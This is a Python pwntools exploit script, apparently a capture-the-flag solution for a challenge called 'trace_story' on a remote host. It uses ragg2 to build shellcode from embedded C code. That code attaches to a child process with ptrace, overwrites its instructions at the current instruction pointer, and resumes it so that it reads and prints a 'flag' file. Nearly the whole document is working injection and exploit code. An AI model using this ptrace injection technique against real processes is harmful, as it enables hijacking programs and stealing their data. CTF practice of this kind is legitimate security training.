from pwn import *
import subprocess
context.binary = elf = ELF("./trace_story")

cmd = "ragg2 -a x86 -b 64 trace_code.c 2>/dev/null"
cmd2 = "ragg2 -a x86 -b 64 -z trace_code.c 2>/dev/null"

injected_code = """
main()
{{
    char buf[100];
    int i = 0;
    int fd = open("flag",0,0);
    read(fd, buf, 100);
    write(1, buf, 100);

    exit(-8);
}}
"""

code = """
struct user_regs_struct
{{
   unsigned long long int r15;
   unsigned long long int r14;
   unsigned long long int r13;
   unsigned long long int r12;
   unsigned long long int rbp;
   unsigned long long int rbx;
   unsigned long long int r11;
   unsigned long long int r10;
   unsigned long long int r9;
   unsigned long long int r8;
   unsigned long long int rax;
   unsigned long long int rcx;
   unsigned long long int rdx;
   unsigned long long int rsi;
   unsigned long long int rdi;
   unsigned long long int orig_rax;
   unsigned long long int rip;
   unsigned long long int cs;
   unsigned long long int eflags;
   unsigned long long int rsp;
   unsigned long long int ss;
   unsigned long long int fs_base;
   unsigned long long int gs_base;
   unsigned long long int ds;
   unsigned long long int es;
   unsigned long long int fs;
   unsigned long long int gs;
}};

void fake_sleep(int seconds)
{{
    struct timeval {{
        long     tv_sec;
        long    tv_usec;
    }};
    long long t;
    
    struct timeval t1, t2;
    gettimeofday(&t1, 0);
    while(t2.tv_sec < (t1.tv_sec + seconds))
    {{
        gettimeofday(&t2, 0);
    }}
}}

int
poke (pid_t pid, unsigned char *src, void *dst, int len)
{{
  int      i;
  uint32_t *s = (uint32_t *) src;
  uint32_t *d = (uint32_t *) dst;

  for (i = 0; i < len; i+=4, s++, d++)
    {{
      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)
        {{
        return -1;
        }}
    }}
  return 0;
}}

main() {{

    unsigned long long ptr = 0;
    unsigned long pid = {};

    struct user_regs_struct regs;

    unsigned char * shellcode = {};

    ptrace(PTRACE_ATTACH,pid,0,0);
    ptrace(PTRACE_SINGLESTEP,pid,0,0);
    ptrace(PTRACE_GETREGS,pid,0,&regs);

    while(regs.rax != pid)
    {{
        ptrace(PTRACE_ATTACH,pid,0,0);
        ptrace(PTRACE_SINGLESTEP,pid,0,0);
        ptrace(PTRACE_GETREGS,pid,0,&regs);
    }}

    fake_sleep(1);

    unsigned long long addr = regs.rip;

    poke (pid, shellcode, (void*)addr, {});

    ptrace(PTRACE_CONT, pid, 0, 0);

    fake_sleep(10);

    return 0;
}}"""

def compile_code(code):
    with open("trace_code.c", "w") as f:
        f.write(code)
    
    output = subprocess.check_output(cmd, shell=True)
    data = output.split(b'\n')[1].decode()
    data_bytes = bytes.fromhex(data)
    # print(data)
    # print(data_bytes)
    return data_bytes

def compile_inject_code(code):
    with open("trace_code.c", "w") as f:
        f.write(code)
    
    output = subprocess.check_output(cmd2, shell=True)
    data = output.split(b'\n')[1].decode()
    return data

io = remote("0.cloud.chals.io", 15148)
# io = elf.process()
# io = process("/usr/bin/strace -D ./trace_story", shell=True)

# gdb.attach(io,"""
# b *0x00401907
# c
# """)

io.readuntil("[DEBUG] child pid: ")
pid_str = io.readline().strip().split()[-1]
pid = int(pid_str)
print("Pid",pid)
PTRACE = 0x65

inject_code = injected_code

inject_data = compile_inject_code(inject_code)
print(inject_data)
print((len(inject_data)-3)/3)

sc_len = int((len(inject_data)-3)/3) + 1


temp_bytes = inject_data.replace("\"","")
temp_bytes = temp_bytes.replace("\\x","")
print(temp_bytes)
temp_bytes = bytes.fromhex(temp_bytes)

for i in range(0,len(temp_bytes),8):
    print(temp_bytes[i:i+8])
test_code = code.format(pid, inject_data, sc_len)

data = compile_code(test_code)
io.send(data)
io.clean()
io.interactive()
